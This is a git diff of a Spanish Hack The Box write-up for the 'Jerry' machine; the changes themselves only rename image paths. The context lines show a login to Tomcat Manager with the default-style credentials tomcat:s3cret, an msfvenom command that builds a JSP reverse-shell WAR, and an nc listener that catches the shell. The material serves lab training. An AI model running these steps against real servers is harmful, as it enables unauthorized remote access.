@@ -3,7 +3,7 @@ title: "Jerry - WriteUp"
 date: Sun Jun 30 2024 22:00:00 GMT+0200 (Central European Summer Time)
 categories: [WriteUps, HTB, Windows]
 tags: [ctf, nmap, htb, msfvenom, windows, apache, tomcat, bash]
-image: /assets/img/htb-writeups/Pasted image 20240219180022.png
+image: /assets/img/htb-writeups/Pasted-image-20240219180022.png
 ---
 
 {% include machine-info.html
@@ -13,13 +13,13 @@ image: /assets/img/htb-writeups/Pasted image 20240219180022.png
   platform="HTB"
 %}
 
-![Jerry](/assets/img/htb-writeups/Pasted image 20240219180022.png)
+![Jerry](/assets/img/htb-writeups/Pasted-image-20240219180022.png)
 
 Tags:     
 
 ------
 
-![JERRY](/assets/img/htb-writeups/Pasted image 20240219180022.png)
+![JERRY](/assets/img/htb-writeups/Pasted-image-20240219180022.png)
 
 Aunque Jerry es una de las máquinas más sencillas de Hack The Box, es realista ya que Apache Tomcat a menudo se encuentra expuesto y configurado con credenciales comunes o débiles.
 
@@ -48,7 +48,7 @@ PORT     STATE SERVICE VERSION
 
 HTTP puerto 8080
 
-![JERRY](/assets/img/htb-writeups/Pasted image 20240219183148.png)
+![JERRY](/assets/img/htb-writeups/Pasted-image-20240219183148.png)
 
 WHATWEB
 
@@ -56,7 +56,7 @@ WHATWEB
 $ whatweb -v http://10.129.136.9:8080
 ```
 
-![JERRY](/assets/img/htb-writeups/Pasted image 20240219191426.png)
+![JERRY](/assets/img/htb-writeups/Pasted-image-20240219191426.png)
 
 Nos vamos a la ruta típica de TomCat
 
@@ -64,11 +64,11 @@ Nos vamos a la ruta típica de TomCat
 http://10.129.136.9:8080/manager/html
 ```
 
-![JERRY](/assets/img/htb-writeups/Pasted image 20240219192754.png)
+![JERRY](/assets/img/htb-writeups/Pasted-image-20240219192754.png)
 
 Probamos las típicas credenciales por defecto como admin/admin y nos arroja este mensaje de error:
 
-![JERRY](/assets/img/htb-writeups/Pasted image 20240219192934.png)
+![JERRY](/assets/img/htb-writeups/Pasted-image-20240219192934.png)
 
 Si nos fijamos nos aparecen unas credenciales parecidas a las que suelen venir por defecto pero un poco modificadas, vamos a probarlas:
 
@@ -78,7 +78,7 @@ tomcat:s3cret
 
 Y entramos:
 
-![JERRY](/assets/img/htb-writeups/Pasted image 20240219193228.png)
+![JERRY](/assets/img/htb-writeups/Pasted-image-20240219193228.png)
 
 Ahora lo que nos hace falta es ganar acceso a la máquina a través de un archivo _.war_ malicioso que podremos crear con _msfvenom_:
 
@@ -88,11 +88,11 @@ $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.131 LPORT=443 -f war -o 
 
 Una vez creado nos vamos a la sección "WAR file to deploy" y subimos el .war malicioso:
 
-![JERRY](/assets/img/htb-writeups/Pasted image 20240219193740.png)
+![JERRY](/assets/img/htb-writeups/Pasted-image-20240219193740.png)
 
 Nos ponemos en escucha por el puerto que hayamos configurado en el payload y pulsaremos sobre el enlace shell que se ha creado:
 
-![JERRY](/assets/img/htb-writeups/Pasted image 20240219193945.png)
+![JERRY](/assets/img/htb-writeups/Pasted-image-20240219193945.png)
 
 ```bash
 $ rlwrap nc -nlvp 443
